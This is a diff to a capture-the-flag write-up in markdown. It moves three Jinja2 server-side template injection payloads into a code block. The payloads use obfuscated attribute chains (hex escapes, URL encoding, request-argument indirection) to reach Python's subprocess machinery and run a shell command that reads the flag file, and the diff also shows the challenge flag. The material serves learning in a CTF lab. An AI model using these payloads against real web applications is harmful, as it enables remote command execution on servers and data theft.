@@ -851,9 +851,11 @@ and processed any unintended parameters. There was no validation of user input p
 specific **`value`** parameter.
 
 Some of the payloads seen from other community write ups include the below:
-1. **`\{\{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5f'+'b'+'ase\x5f\x5f')|attr('x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(258)('cat flag.txt',shell=True,stdout=-1)|attr('communicate')()\}\}`**
-2. **`\{\{''[request.args.a][request.args.b][2][request.args.c]()[258]('cat+flag.txt',shell%3dTrue,stdout%3d-1).communicate()[0].strip()\}\}&a=__class__&b=__mro__&c=__subclasses__`**
-3. **`\{\{()|attr(%27\x5f\x5fclass\x5f\x5f%27)|attr(%27\x5f\x5f\x62\x61\x73\x65\x5f\x5f%27)|attr(%27\x5f\x5fsubclasses\x5f\x5f%27)()|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(258)(%27cat+flag.txt%27,shell=True,stdout=-1)|attr(%27communicate%27)()|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(0)|attr(%27decode%27)(%27utf-8%27)\}\}`**
+```text
+1. {{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5f'+'b'+'ase\x5f\x5f')|attr('x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(258)('cat flag.txt',shell=True,stdout=-1)|attr('communicate')()}}
+2. {{''[request.args.a][request.args.b][2][request.args.c]()[258]('cat+flag.txt',shell%3dTrue,stdout%3d-1).communicate()[0].strip()}}&a=__class__&b=__mro__&c=__subclasses__
+3. {{()|attr(%27\x5f\x5fclass\x5f\x5f%27)|attr(%27\x5f\x5f\x62\x61\x73\x65\x5f\x5f%27)|attr(%27\x5f\x5fsubclasses\x5f\x5f%27)()|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(258)(%27cat+flag.txt%27,shell=True,stdout=-1)|attr(%27communicate%27)()|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(0)|attr(%27decode%27)(%27utf-8%27)}}
+```
 
 The final flag (also seen from community write ups) was **`flag{m0mmy_s33_1m_4_r34l_n1nj4}`**.
 
